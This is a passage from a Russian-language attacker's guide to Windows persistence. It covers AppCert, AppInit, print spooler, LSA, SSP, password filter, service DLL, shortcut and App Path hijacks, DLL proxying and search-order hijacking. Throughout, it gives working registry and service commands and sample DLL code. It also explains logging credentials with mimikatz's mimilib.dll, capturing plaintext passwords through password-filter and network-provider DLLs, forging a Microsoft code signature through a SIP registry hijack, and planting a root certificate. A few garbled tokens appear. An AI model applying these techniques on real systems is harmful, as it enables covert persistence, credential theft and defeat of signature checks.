- Создание вредоносной DLL: Мы делаем DLL, содержащую вредоносный код.
- Изменяем реестр, чтобы зарегистрировать библиотеку DLL в качестве Time Provider:
  - Мы добавляем записи в реестр, чтобы зарегистрировать свою библиотеку DLL в качестве нового Time Provider.
  - key for Time Providers обычно находится в `HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders`.
- Выполнение при запуске Windows Time Service: Всякий раз, когда служба Windows Time Service запускается (обычно при загрузке системы), она загружает зарегистрированные DLL Time Provider, выполняя наш код.

## 22. Screensaver
Использование screensaver для persistence - это метод, при котором мы заменяем лигитимный файл screensaver вредоносным бинарником или скриптом. 
Этот метод использует тот факт, что Screensaver в Windows по сути являются исполняемыми файлами с расширением `.scr`. 
При срабатывании заставки (из-за бездействия пользователя) выполняется вредоносный код.

### Understanding Screensaver for Persistence
Заставки Windows находятся в каталоге System32 и могут быть установлены с помощью реестра Windows или панели управления. 
Заменив допустимый файл заставки вредоносным или изменив настройки реестра таким образом, чтобы они указывали на вредоносный файл, мы можем добиться persistence в системе.

### Scenario of Screensaver Attacks
- Создание вредоносного бинарника: Мы подготавливаем бинарник со своим вредоносным кодом и присваиваем ему расширение .scr.
- Заменяем на вредоносный Screensaver или указываем на него:
  - Мы либо заменяем лигитмный файл Screensaver в каталоге System32 своим вредоносным бинарником, либо
  - Изменяем реестр, чтобы указать в настройках Screensaver на вредоносный бинарник.
- Выполнение при активации Screensaver: Когда система переходит в режим ожидания и активируется Screensaver, выполняется вредоносный код.

## 23. AppCert
AppCert DLL загружается в любой процесс, который вызывает функции `CreateProcess`, `CreateProcessAsUser`, `CreateProcessWithLoginW`, `CreateProcessWithTokenW` или `WinExec`. 
Библиотека DLL должна быть специально реализована и экспортировать функцию `CreateProcessNotify`.

### Как это работает?(POC)
- Создаем DLL: как я уже говорили ранее, библиотека DLL должна экспортировать функцию с именем `CreateProcessNotify`.
    
        LPCWSTR target = L"C:\\Windows\\System32\\cmd.exe";
        VOID Execution() 
        {
            CreateFileW(L"C:\\OurFileAsAnExample.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            return;
        }

        extern "C" __declspec(dllexport) NTSTATUS NTAPI CreateProcessNotify(LPCWSTR lpApplicationName, REASON enReason) 
        {
            NTSTATUS NtStatus = 0x00000000; // STATUS_SUCCESS
            int Result = lstrcmpiW(target, lpApplicationName);
            if (Result) { Execution(); }
            return NtStatus;
        }

- Set registry key: DLL должна быть указана в реестре: https://imgur.com/a/ZdiSZAe

      reg add “HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls” /v “persist” /d C:\mal.dll

- Login: после входа в систему DLL будет исполнена: https://imgur.com/a/5ebBkOL

## 24. AppInit
DLL AppInit вставляются в любой загружаемый процесс `user32.dll` и почти все процессы в Windows загружают этот модуль, что делает его хорошим кандидатом на persistence.
- Создаем DLL: Пишем DLL, которая содержит вредоносный код
- Set registry: DLL должна быть установлена в реестре: 

      reg add “HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows” /v “AppInit_DLLs” /d “C:\users\lab-10-workgroup\desktop\persist.dll” /t REG_SZ

- Включаем AppInit(включаем AppInit, так как по умолчанию он выключен(`https://learn.microsoft.com/ru-ru/windows/win32/dlls/secure-boot-and-appinit-dlls`)): https://imgur.com/a/TbKUlIx

      reg add “HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows” /v “LoadAppInit_DLLs” /d 0x1 /t REG_DWORD

- Login: после входа в систему DLL будет исполнена: https://imgur.com/a/JGOzW0n

## 25. Port Monitor
Port Monitor DLLs загружаются при загрузке через spooler service, которая является printer service. Мы можем добавить DLL двумя способами:

    Используя WinAPI: AddMonitor
    Вручную: указав путь к DLL в реестре

Для этого сценария мы будем использовать последний. DLL может быть помещена в папку system32.

### Как это работает?(POC)
- Создаем DLL: Пишем DLL, которая содержит вредоносный код
- Set registry: DLL должна быть установлена в реестре: https://imgur.com/a/v9l3L7q
    
      reg add “hklm\system\currentcontrolset\control\print\monitors\Hadess” /v “Driver” /d “c:\users\lab-10-workgroup\desktop\persist.dll” /t REG_SZ /f
- Login: после входа в систему DLL будет исполнена: https://imgur.com/a/UYbp5zT

## 26. PrintProcessor
Эти DLL также загружаются при загрузке spooler service. 
DLL должна быть помещена в специальную директорию `C:\Windows\System32\spool\prtprocs\x64`, но также она может быть получена с помощью API `GetPrintProcessorDirectory`.

### Как это работает?(POC)
- Создаем DLL: Пишем DLL, которая содержит вредоносный код
- Ищем print processor директорию: пишем легкий код на cpp для поиска директории

        int main()
        {
            DWORD cbNeeded = 0;
            LPBYTE pPrintProcessorInfo = nullptr;

            GetPrintProcessorDirectoryA(NULL, NULL, 1, NULL, NULL, &cbNeeded);

            pPrintProcessorInfo = new BYTE[cbNeeded];
            GetPrintProcessorDirectoryA(NULL, NULL, 1, pPrintProcessorInfo, cbNeeded, &cbNeeded);

            std::cout << (LPCSTR)pPrintProcessorInfo;
        }

- Переносим DLL: DLL должна быть перенесена в полученную директорию: https://imgur.com/a/TVxrBCE
- Set registry: снчала spooler service должна быть остановлена.

      net stop spooler

      reg add “HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\hadess” /v “Driver” /d “persist.dll” /t REG_SZ /f

    После того как добавили ключ, стартуем.
      
      net start spooler

    https://imgur.com/a/zZGYKNr

## 27. Local Security Authority(LSA)
LSA или Local Security Authority используется для security management, которую приложения могут использовать для аутентификации и входа пользователей в систему. Действия ниже в неправильном ключе могут
сломать систему.

### Authentication Package
Authentication packages - это DLLs, которые загружаются LSA и обеспечивают поддержку multiple logon processes и multiple security protocols.
Для правильной работы они должны быть реализованы особым образом. 

Чтобы установить DLL, мы сначала должны запросить используемые библиотеки DLL текущего Authentication package, а 
затем добавить свои собственные в конце. Наша библиотека DLL также должна быть расположена в system32.

    reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v “Authentication Packages”

https://imgur.com/a/xwq3gPQ

Как можно увидеть, там уже указана DLL, поэтому мы должны добавить к ней нашу DLL: https://imgur.com/a/D2NiCnk

    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v “Authentication Packages” /t REG_MULTI_SZ /d “msv1.0\0persist.dll” /f

## 28. Security Support Provider(SSP)
Эти DLLs используются для расширения windows authentication и загружаются при загрузке с помощью LSA. 
Они также должны быть реализованы особым образом. 
Один из способов, которым мы можем злоупотребить, - это использовать `mimilib.dll`, предоставляемый mimikatz, для сброса учетных данных любого пользователя, который входит в систему.

Сначала нужно запросить его, чтобы узнать, есть ли какая-либо существующая DLL, и если есть, добавить нашу собственную в конце.

    reg query “hklm\system\currentcontrolset\control\lsa” /v “Security Packages”

https://imgur.com/a/33xYJLI

Теперь мы можем добавить `mimilib.dll` к LSA:

    reg add “hklm\system\currentcontrolset\control\lsa” /v “Security Packages” /d “mimilib.dll” /t REG_MULTI_SZ /f

Учетные данные будут размещены в `C:\Windows\System32\kiwissp.log`.

### Driver
Как следует из названия, это DLLs, используемые в качестве driver для LSA.

Наша dll может быть установлена с помощью следующей команды:

    reg add “HKLM\SYSTEM\CurrentControlSet\Services\NTDS” /v LsaDbExtPt /d “C:\Windows\system32\persist.dll” /t REG_SZ /f

### Password Filter
DLLs с Password Filter используются для принудительного применения Password Filter, и LSA проверяет пароли пользователей перед их принятием, передавая их во все указанные DLLs с Password Filter.

Используя этот метод, мы можем как сохранять свои данные, так и извлекать пароль в виде открытого текста.

Сначала мы должны запросить реестр, чтобы узнать, указана ли какая-либо DLL: https://imgur.com/a/BzoifyI

    reg query “HKLM\SYSTEM\CurrentControlSet\Control\Lsa” /v “Notification Packages”

Указан только `scecli`, и к нему должна быть добавлена наша DLL.
Обратите внимание, что она должна быть размещена в system32.

    reg add “HKLM\SYSTEM\CurrentControlSet\Control\Lsa” /v “Notification Packages” /d “scecli\0pwfilter.dll” /t REG_MULTI_SZ /f

Пароль в виде открытого текста можно получить `C:\windows\temp\logFile.txt`

## 29. Vsprog
Файлы Vsprog - это файлы, созданные Visual Studio. В этих файлах мы можем указать команду, которая будет выполняться при билде. Команда может быть указана с помощью следующей строки:

    <Exec Commands=”command here”/>

## 30. Git hooks
Git hooks используются для управления репозиториями git путем размещения скрипта` pre-commit/post-commit` и..  Находится в файле `.git/hooks`.

Хотя они обычно используются для управления, мы можем использовать их совершенно по другой причине, которая может заключаться в persistence, data exfiltration и т.д.

## 31. SCM 

Как следует из названия, Service Control Manager (SCM) управляет службами на компьютере.
В обязанности SCM входит отслеживание конфигурации, которая описывает, какие службы необходимо запускать в процессе загрузки, и порядок их создания.

SCM отслеживает текущую конфигурацию и последнюю Last Known Good конфигурацию (LKG). 
При внесении изменений в конфигурацию текущая конфигурация обновляется, но LKG не изменяется. 
При следующей загрузке SCM использует порядок, определенный текущей конфигурацией. 
Если загрузка завершится успешно, LKG также обновится. Если загрузка завершится неудачно, SCM попытается запустить службы во второй раз после LKG.

По умолчанию Winlogon уведомляет SCM о том, что загрузка прошла успешно, после первого успешного входа в систему. 
В некоторых ситуациях мы могли бы предпочесть определить успешную загрузку по-другому (например, если серверу Windows необходимо запустить определенное приложение, 
мы могли бы захотеть включить успешный запуск приложения как часть успешной загрузки). 
Корпорация Майкрософт позволяет юзерам определять пользовательскую программу проверки загрузки для таких ситуаций, 
создав раздел реестра `HKLM\System\CurrentControlSet\Control\BootVerificationProgram` и установив значение `ImagePath` равным пути к нашей программе проверки загрузки.

Еще одно изменение, которое следует внести при лигитмном использовании этой функции, - это ключ `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`. 
Установка значения `ReportBootOk` равным 0 в этом ключе не позволит Winlogon уведомлять SCM об успешной загрузке и предотвратит конфликты с программой проверки загрузки.
Наша программа с правами администратора может изменять этот ключ и устанавливать произвольную программу проверки загрузки, которую SCM будет запускать после каждой загрузки. 
Vы можем видеть фрагмент Procmon, в котором SCM (процесс с именем “services.exe”) выполняет поиск ключа и загружает бинарник, установленный в этом ключе: https://imgur.com/a/ZxfQ7U3

## 32. Path Interception by App Path:

Этот метод работает, когда процесс использует функцию `ShellExecuteEx` и предоставляет только имя бинарника, 
а не полный путь (например, при использовании командной строки Windows для запуска cmd). 
В Windows есть определенное количество местоположений, в которых выполняется поиск бинарника в этих случаях. 
Следующие ключи находятся в двух проверенных местах: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths` и `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths`.

Если у любого из key есть sub-key с именем бинарника, присвоенным `ShellExecuteEx`, то проверяются значения sub-key.
Если в качестве значения по умолчанию задан путь к бинарнику, то Windows запустит бинарник с этого пути. 
Эта функциональность может позволить нам использовать `ShellExecuteEx` для запуска своих программ из любого места, на которое ссылается ключ, 
вместо того, чтобы копировать программы в труднодоступные места, такие как System32, чтобы они были частью порядка поиска.

Для записи только пути в `HKLM` требуются права администратора. Но поскольку сначала проверяется путь в `HKCU`, даже если администратор задает значение в HKLM, 
наша программа без прав администратора все равно может использовать этот метод, создав новое значение в `HKCU`. 
Это в некотором роде похоже на версии COM hijacking, где, даже если `CLSID` определен в HKLM, наша программа с низкими привилегиями может создать копию `CLSID` в `HKCU` и сделать hijack execution flow.

Наша программа может использовать эту функциональность для переопределения существующего пути к приложению, так что, 
когда пользователь пытается запустить лигитмный процесс с помощью `ShellExecuteEx`, он в конечном итоге запускает вредоносное ПО. 
Мы видим, что происходит, когда путь к приложению для chrome.exe имеет значение Notepad++.exe: https://imgur.com/a/uTzCZvk

## 33. SMSS Configuration
Session Manager Sub-System (a.k.a. the Session Manager or smss) - это первый процесс, который запускается в процессе boot'а. 
Она отвечает за множество различных задач, включая запуск некоторых других процессов, которые запускаются в начале процесса загрузки. 
Для этого он частично полагается на значения, заданные в разделе реестра `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager`.
Он использует несколько значений для определения того, какие процессы запускать, включая `BootExecute`, `PlatformExecute`, `SetupExecute` и `s0InitialCommand`. 
Каждое значение имеет свое назначение и лигитимное использование. 
Однако наша программа с правами администратора может изменять эти ключи, устанавливая себя в качестве таргетной программы и запускаясь в числе первых процессов при загрузке.

Однако стоит отметить, что любая наша программа, использующая этот метод, должна быть написана специальным образом, поскольку она будет запущена на “нейтральной территории”, и — в зависимости от 
того, когда именно она будет запущена — в память не будут загружены известные библиотеки, не будет `HKCU hive` и даже будет отсутствовать часть `HKLM hive`. 
Ниже показано, что произошло бы с Notepad, если бы оно было установлено в качестве первой строки в многострочном строковом значении `BootExecute`.
Блокнот запускается как вторая программа, запускаемая при полной загрузке, но затем сразу же выходит из строя и закрывается, поскольку он написан не таким образом, 
чтобы его можно было запускать в таких условиях: https://imgur.com/a/h7Doulb

## 34. RDP Startup Program
Одной из удобных фичей RDP в Windows является возможность копирования и вставки данных между хостом и клиентом. 
Чтобы упростить эту фичу, Майкрософт предоставляет компьютерам с Windows программу под названием `rdpclip`. 
Постоянный запуск `rdpclip` был бы пустой тратой ресурсов, поскольку он применим только при входе в клиент с помощью RDP. 
Из-за этого Windows запустит `rdpclip` только тогда, когда пользователь войдет в систему с помощью RDP. 
Когда произойдет вход в систему, Windows выполнит поиск ключа `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd` в реестре.

Если ключ существует и для StartupPrograms value set to an executable, Windows запустит исполняемый файл при входе в систему. 
По умолчанию для этого ключа установлено значение `rdpclip`, что приводит к запуску этого процесса после входа в систему по протоколу RDP. 
В этом сообщении в блоге содержится более подробная информация о `rdpclip` и связанной с ним уязвимости.

Наша программа с правами администратора может изменять программы запуска под себя, в результате чего наша программа запускается каждый раз, 
когда пользователь входит в клиент через RDP, но не при обычном входе в систему. В следующем фрагменте показано, как служба, ответственная за запуск `rdpclip`, 
в конечном итоге запускает calc вместо этого при изменении ключа: https://imgur.com/a/i4sBH4x

## 35. Default Browser:
Изменение браузера по умолчанию может показаться очевидной идеей.
Существует даже аналогичный метод изменения ассоциации файлов по умолчанию.
Несмотря на то, что концепция кажется простой, реализация таковой не является, как и большинство всех представленных тут концепций и методов.
key, который associates a specific URL protocol с процессом, является: `HKCU\Software\Microsoft\Windows\Shell\Associations\UrlAssociation\<protocol>\UserChoice`.

Для каждого ключа требуется два значения: `ProgID` и unique hash value.
`ProgID` запускает процесс, который будет обрабатывать любой URL-адрес, который будет открыт.
Однако хэш используется для validation.
Похоже, что хэш является результатом запатентованного алгоритма, используемого Microsoft, который принимает как минимум два inputs: value of `ProgID` и некоторое unique value,
приводящее к разным хэшам, даже если используется один и тот же `ProgID`. Если наша программа изменяет `ProgID`, не затрагивая хэш, это приводит 
к неверному хэшу, в результате чего Windows переустанавливает браузер по умолчанию на Microsoft Edge.

Мы можем попытаться перепроектировать алгоритм хэширования и реализовать его самостоятельно (или воспользоваться некоторыми уже существующими инструментами). 
В качестве альтернативы, если мы получим доступ к компьютеру, мы также можем попытаться использовать настройки Windows,
чтобы установить наше ПО в качестве браузера по умолчанию. Однако для этого требуется изменить еще два ключа. 
Первый - это `HKLM\SOFTWARE\RegisteredApplications`, где нам нужно добавить значение для своего процесса, указывающее на еще один ключ в выбранном нами местоположении.

https://imgur.com/a/CQhQ6PX - Этот ключ представляет возможности исполняемого файла и, как таковой, должен содержать sub-key, называемый `URLAssociations`, 
для определения возможности обработки URL-адресов, при этом значения HTTP и HTTPS устанавливаются в качестве ProgID нашей проги: https://imgur.com/a/gKdbDZi

## 36. SIP & Trust Provider Hijacking:
Тут я попытаюсь подписать простой тестовый "rogue" скрипт powershell-forged.ps1, 
содержащий только одну строку кода, с помощью сертификата Microsoft и обойти любые меры защиты / политики, которые могут быть включены в белый список, если скрипт не подписан.

### Execution 
Скрипт, который я попытаюсь подписать: https://imgur.com/a/NMHyTnQ
Непосредственно перед тем, как я начну, давайте убедимся, что скрипт не подписан с помощью командлета `Get-AuthenticodeSignature` и `sigcheck` от SysInternals: https://imgur.com/a/YRNSarx 

Чтобы подписать скрипт сертификатом Microsoft, нам нужно сначала найти native Microsoft Signed PowerShell script. 
Для этого я использовал powershell: https://imgur.com/a/wsIsa7V

    Get-ChildItem -Path C:\*.ps* -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "# SIG # Begin signature block"

Я выбрал один скрипт наугад и просто проверил, подписан ли он - к счастью да: https://imgur.com/a/e2MeezC

    type C:\Windows\WinSxS\x86_microsoft-windows-m..ell-cmdlets-modules_31bf3856ad364e35_10.0.16299.15_none_c7c20f51cd336675\Wdac.psd1

Давайте скопируем блок signature Microsoft в мой скрипт: https://imgur.com/a/8BTEpfV

Теперь давайте изменим реестр по адресу: 

    HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}

C этого: https://imgur.com/a/LgTkG0D
На:

- DLL: `C:\Windows\System32\ntdll.dll`
- FuncName: `DbgUIContinue`

На это: https://imgur.com/a/2Hcofg5

Теперь давайте запустим новый экземпляр powershell (чтобы изменения в реестре вступили в силу) и проверим подпись поддельного скрипта - обратите внимание, 
что теперь он отображается как подписанный, проверенный и действительный: https://imgur.com/a/MSw3hL3

## 37. Installing Root Certificate
Installing Root Certificate

### Execution
Добавление с сертификата native windows binary: https://imgur.com/a/5yGtrQA

    certutil.exe -addstore -f -user Root C:\Users\spot\Downloads\certnew.cer

Проверяем, установлен ли сертификат: https://imgur.com/a/rD5sgIq
Добавление сертификата с помощью powershell: https://imgur.com/a/WUEPgQa

    Import-Certificate -FilePath C:\Users\spot\Downloads\certnew.cer -CertStoreLocation Cert:\CurrentUser\Root\

## 38. Word Library Add-Ins
Возможно, сохранить свой persistance в userland, злоупотребив надстройками Word Library, 
поместив вредоносную DLL в надежное хранилище Word.
Как только DLL будет там, Word загрузит ее при следующем запуске.

### Execution
Получить Word's trusted locations, куда library add-ins может быть закинута: https://imgur.com/a/lXoD4bH

     Get-ChildItem "hkcu:\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations"

Эти trusted locations на самом деле определены в Word's Security Center, если есть доступ к GUI: https://imgur.com/a/THD6Wdk
Создадим простую DLL, которая запустит notepad.exe как только DLL addin будет загружена: https://imgur.com/a/4Jo7bj5

Скомпилируем DLL, скопируем его в Startup Folder и переименуем его в `evilm64.wll`: https://imgur.com/a/RtfL2oy

    mv .\evilm64.dll .\evilm64.wll

https://imgur.com/a/Zn5WL4E

В следующий раз, когда жертва откроет Word, файл `evilm64.wll` будет загружен и запущен: https://imgur.com/a/BdOvQNK
Интересно отметить, что Process Explorer не видит файл `evilm64.wll`, загруженный ни в одном из запущенных в данный момент процессов: https://imgur.com/a/d5IzzGU

...хотя мы определенно можем видеть, что надстройка теперь распознается с помощью Word: https://imgur.com/a/zClPMWw

;-
У меня этот метод не сработал в версии Office 365, но сработал в Office Professional. 
Не уверен, есть ли ошибка в версии 365 или это просто ограничение этой версии.

## 39. Modifying .lnk Shortcuts
Скажем, в compromised system есть ярлык для программы HxD64: https://imgur.com/a/5MA2yuL
Этот ярлык можно перехватить и использовать для persistence. Изменим target ярлыка через powershell:

    powershell.exe -c "invoke-item \\VBOXSVR\Tools\HxD\HxD64.exe; invoke-item c:\windows\system32\calc.exe"

Он запустит HxD64, но также запустит программу по нашему выбору - calc.exe в данном случае. Обратите внимание, что значок быстрого доступа сменился на powershell - это ожидаемо: https://imgur.com/a/fF3c3MY
Мы можем изменить его обратно, нажав на "Change Icon" и указав original .exe файл HxD64.exe: https://imgur.com/a/si20v6v

Оригинальный icon вернулся: https://imgur.com/a/BSLbJf3

Ещё нужно сменить значение Run на `Minimized` с `Normal Window`: https://imgur.com/a/Zmuhx73

## 40. Persisting in svchost.exe with a Service DLL
На высоком уровне так работает эта техника:

- Создайть службу EvilSvc.dll DLL (DLL, которая будет загружаться в svchost.exe) с кодом, который мы хотим запускать при каждой перезагрузке системы
- Создайть новую службу EvilSvc с помощью `binPath= svchost.exe`
- Добавить значение ServiceDll в службу EvilSvc и укажите его в service DLL, скомпилированной на шаге 1
- Изменить `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost`, чтобы указать, в какую группу следует загружать service
- Запустить EvilSvc service
- EvilSvc запущен, и его service dll(EvilSvc.dll) загружена в svchost.exe

### Walkthrough

### 1. Делаем Service DLL
### 2. Create EvilSvc Service

Теперь создадим новую службу под названием `EvilSvc` и укажем в качестве 
`binPath` значение `svchost.exe -k DcomLaunch`, которое сообщит Service Control Manager, что мы хотим, чтобы наш EvilSvc размещался в `svchost.exe` в группе служб под названием `DcomLaunch`:

    sc.exe create EvilSvc binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" type= share start= auto

### 3. Modify EvilSvc - Specify ServiceDLL Path

Затем внутри `HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\` создаем новое value с именем `ServiceDll` и указываем его в `EvilSvc.dll`(service DLL compiled на шаге 1):

    reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f

;- `EvilSvc.dll` должна существовать в `C:\Windows\system32\EvilSvc.dll` ;-

На этом этапе наш `EvilSvc` должен быть создан со всеми нужными параметрами, как показано в реестре: https://imgur.com/a/977txp5

### 4. Group EvilSvc with DcomLaunch

В качестве последнего шага нам нужно сообщить к Service Control Manager, в какой группе сервисов должен загружаться наш `EVILSVC`.
 
Мы хотим, чтобы он загружался в группу `DcomLaunch`, поэтому нам нужно добавить имя нашей службы EvilSvc в список служб в значении `DcomLaunch` в `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost`: https://imgur.com/a/71IC16A

### 5. Start EvilSvc Service

Теперь мы можем попробовать загрузить наш EvilSvc service:

    sc.exe start EvilSvc

`EvilSvc` теперь загружен в svchost.exe как часть группы служб `DcomLauncher`: https://imgur.com/a/vYZkIXm
## 41. DLL Proxying for Persistence
Этот метод можно было бы использовать для persistence или data intercept, но тут меня интересует только persistence.

В контексте вредоносных программ проксирование DLL - это метод DLL hijacking, при котором легитимная библиотека DLL, скажем, legit.dll, переименовывается в legit1.dll, 
а вредоносная dll, которая экспортирует все те же функции, что и legit1.dll, размещается вместо legit.dll.

Как только dll является hijacked, всякий раз, когда программа вызывает функцию, скажем, exportedFunction1 из legit.dll, вот что происходит:

- legit.dll загружается в вызывающий процесс и выполняет свой вредоносный код, скажем, обращается к C2

- legit.dll перенаправляет вызов на exportedFunction1 в legit1.dll

- legit1.dll выполняет функцию exportedFunction1

Эта функция, перенаправляющая данные из одной библиотеки DLL в другую, дает методу название - DLL proxying, 
поскольку вредоносная DLL находится между приложением, вызывающим экспортированную функцию, и легитимной библиотекой DLL, которая реализует эту экспортированную функцию.

На приведенной диаграмме показано, как все это выглядит на высоком уровне до и после перехвата библиотеки DLL: https://imgur.com/a/TWmF2Vd

### Walkthrough
На высоком уровне этот метод работает следующим образом:

1) Определите, какую DLL следует hijackнуть. Допустим, она находится в `c:\temp\legit.dll`. Перемещаем ее в `c:\temp\legit1.dll`
2) Получить список всех экспортируемых функций из `c:\temp\legit1.dll`
3) Создать вредоносную DLL `malicious.dll`, которая после загрузки таргетным процессом выполняет наш payload
4) Внутри `malicious.dll`, перенаправить все экспортированные функции от `legit.dll` (это та DLL, которую мы перехватываем) на legit1.dll (это все та же DLL, которую мы перехватываем, только с новым именем) 
5) Скопируйте `malicious.dll` на `c:\temp\legit.dll`
6) На этом этапе любая программа, которая вызывает любую экспортированную функцию в `legit.dll`, теперь выполнит нашу malicious payload0, а затем передаст выполнение той же экспортированной функции в c:\temp\legit1.dll.

### Target DLL
Для демонстрационных целей мы создадим нашу собственную DLL, которая будет hijack'нута, под названием `legit.dll`:

    #include "pch.h"

    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }

    extern "C" __declspec(dllexport) VOID exportedFunction1(int a)
    {
        MessageBoxA(NULL, "Hi from legit exportedFunction1", "Hi from legit exportedFunction1", 0);
    }

    extern "C" __declspec(dllexport) VOID exportedFunction2(int a)
    {
        MessageBoxA(NULL, "Hi from legit exportedFunction2", "Hi from legit exportedFunction2", 0);
    }

    extern "C" __declspec(dllexport) VOID exportedFunction3(int a)
    {
        MessageBoxA(NULL, "Hi from legit exportedFunction3", "Hi from legit exportedFunction3", 0);
    }

Допустим, теперь мы скомпилировали все вышесказанное в виде `legit.dll` в `c:\temp\legit.dll`. У него есть 3 экспортируемые функции: https://imgur.com/a/8ejUKrn
Чтобы подтвердить, что DLL работает, мы можем видеть, что вызов `exportedFunction1` изнутри `legit.dll` выдает всплывающее окно, подобное этому: https://imgur.com/a/sGXBl4s

    rundll32 c:\temp\legit.dll,exportedFunction1

Теперь у нас есть `legit.dll` и его таргетная функция `exportedFunction1` для hijack'а, давайте перейдем к вредоносной DLL, которая будет выполнять функцию проксирования.

### Malicious DLL
Давайте теперь создадим `malicious.dll` - мы будем использовать его для перехвата программ, 
которые вызывают функции из `c:\temp\legit.dll`. Код для `malicious.dll`:

    #include "pch.h"

    #pragma comment(linker, "/export:exportedFunction1=legit1.exportedFunction1")
    #pragma comment(linker, "/export:exportedFunction2=legit1.exportedFunction2")
    #pragma comment(linker, "/export:exportedFunction3=legit1.exportedFunction3")

    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
    
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
            MessageBoxA(NULL, "Hi from malicious dll", "Hi from malicious dll", 0);
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }

Ключевая деталь в malicious.dll - это 
`#pragma` вверху, который указывает linker'у делать export/forward (техническое название - Forward Export) 
функции `exportedFunction1`, `exportedFunction2`, `exportedFunction3` в модуль `legit1.dll`.

Также обратите внимание, что как только `malicious.dll` будет загружена, 
на экране отобразится сообщение с приветствием `Hi from malicious dll`, но это может быть 
любая payload по нашему выбору: https://imgur.com/a/TABEC0r

Давай проверим как `malicious.dll` выполняет наш payload: https://imgur.com/a/m7BR23L

    rundll32 malicious.dll,whatever

### DLL Proxying / Hijacking
Теперь у нас есть все необходимые материалы для тестирования dll proxying concept.

Переместим `malicious.dll` в `c:\temp`, где находится `legit.dll`: https://imgur.com/a/iMl06Nt

Переименуем `legit.dll` в `legit1.dll` и `malicious.dll` в `legit.dll`:

    mv .\legit.dll .\legit1.dll; mv .\malicious.dll .\legit.dll

### Moment of Truth

Теперь давайте вызовем `exportedFunction1` из `legit.dll` - это наша вредоносная DLL с включенным проксированием DLL.

Если перехват будет успешным, мы увидим `Hi from malicious dll` от вредоносной dll, за которым последует `Hi from legit exportedFunction1` от законной `exportedFunction1` из `legit1.dll`:

1) https://imgur.com/a/UP2X37K
2) https://imgur.com/a/ZAmtj97
3) https://imgur.com/a/3sEHjly

## 42. Network Provider DLL 
Мы можем зарегистрировать вредоносные network provider DLL для перехвата учетных данных пользователя в открытом виде в процессе аутентификации. 
DLL network provider позволяют Windows взаимодействовать с определенными сетевыми протоколами,
а также могут поддерживать дополнительные credential management functions. Во время процесса входа в систему 
Winlogon(the interactive logon module) отправляет учетные данные локальному процессу `mpnotify.exe` через RPC. 
Затем процесс `mpnotify.exe` передает учетные данные в открытом виде зарегистрированным credential managers,
уведомляя о том, что происходит событие входа в систему.

Мы можем настроить malicious network provider DLL для получения учетных данных от `mpnotify.exe`.
После установки в качестве credential manager (через реестр) вредоносная DLL может получать и сохранять 
учетные данные при каждом входе пользователя на рабочую станцию или в домен Windows с помощью функции `NPLogonNotify()`.

Целью может быть установка вmalicious network provider DLLs в системах, которые, как известно, 
имеют повышенную активность при входе в систему и/или активность при входе администратора, таких как серверы и контроллеры 
домена.

Пути в реестре:

    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<NetworkProviderName>\NetworkProvider\ProviderPath
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order

;-Starting in Windows 11 22H2, the `EnableMPRNotifications` policy can be 
disabled through Group Policy or through a configuration service provider to prevent Winlogon from sending credentials to network providers.;-

## 44. DLL Search Order Hijacking 
Мы можем выполнять свои собственные вредоносные программы, изменяя search order, используемый для загрузки DLLs.
В системах Windows используется распространенный метод поиска необходимых DLLs для загрузки в программу. 
Hijacking загружаемых DLLs может осуществляться с целью обеспечения persistence, а также повышения привилегий и/или обхода ограничений на выполнение файлов.

Существует множество способов, которыми мы можем перехватить загруженные библиотеки DLL. 
Мы можем размещать троянские файлы DLL в каталоге, который будет искаться перед __cpLocation of a legitimate library,
запрашиваемой программой, в результате чего Windows загружает нашу вредоносную DLL, когда она запрашивается программой-жертвой. 
Мы можем также выполнять preloading DLL, также называемую binary planting attacks, 
размещая вредоносную библиотеку DLL с тем же именем, что и указанная библиотека DLL, в __cpLocation, которое Windows ищет перед лигитимной DLL. 
Часто это местоположение является текущим рабочим каталогом программы. Remote DLL preloading attacks происходят, 
когда программа устанавливает для своего текущего каталога удаленное местоположение, такое как общий веб-ресурс, перед загрузкой библиотеки DLL.

Мы также можем напрямую изменять search order с помощью DLL redirection, которое после включения (in the Registry и создание redirection file)
может привести к загрузке программой другой библиотеки DLL.

Если программа, уязвимая к порядку поиска, настроена на запуск с более высоким уровнем привилегий, то загружаемая DLL, 
